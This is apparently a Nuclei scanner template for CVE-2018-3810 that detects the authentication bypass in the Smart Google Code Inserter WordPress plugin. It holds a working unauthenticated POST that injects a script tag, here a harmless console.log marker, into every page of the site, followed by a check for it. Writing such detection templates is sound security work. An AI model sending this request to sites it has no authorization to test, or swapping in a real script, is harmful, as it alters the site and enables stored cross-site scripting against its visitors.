id: CVE-2018-3810
info:
  author: princechaddha
  classification:
    cve-id: CVE-2018-3810
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287
  description: Oturia Smart Google Code Inserter plugin before 3.5 for WordPress allows
    unauthenticated attackers to insert arbitrary JavaScript or HTML code (via the
    sgcgoogleanalytic parameter) that runs on all pages served by WordPress. The saveGoogleCode()
    function in smartgooglecode.php does not check if the current request is made
    by an authorized user, thus allowing any unauthenticated user to successfully
    update the inserted code.
  name: Oturia WordPress Smart Google Code Inserter <3.5 - Authentication Bypass
  reference:
  - https://www.exploit-db.com/exploits/43420
  - https://nvd.nist.gov/vuln/detail/CVE-2018-3810
  - https://wordpress.org/plugins/smart-google-code-inserter/#developers
  - https://limbenjamin.com/articles/smart-google-code-inserter-auth-bypass.html
  severity: critical
  tags: wordpress,cve,cve2018,google
requests:
- body: sgcgoogleanalytic=<script>console.log("Nuclei - Open-source project [github.com/projectdiscovery/nuclei]")</script>&sgcwebtools=&button=Save+Changes&action=savegooglecode
  headers:
    Content-Type: application/x-www-form-urlencoded
  method: POST
  path:
  - '{{BaseURL}}/wp-admin/options-general.php?page=smartcode'
- matchers:
  - part: header
    type: word
    words:
    - text/html
  - part: body
    type: word
    words:
    - <script>console.log("Nuclei - Open-source project [github.com/projectdiscovery/nuclei]")</script>
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
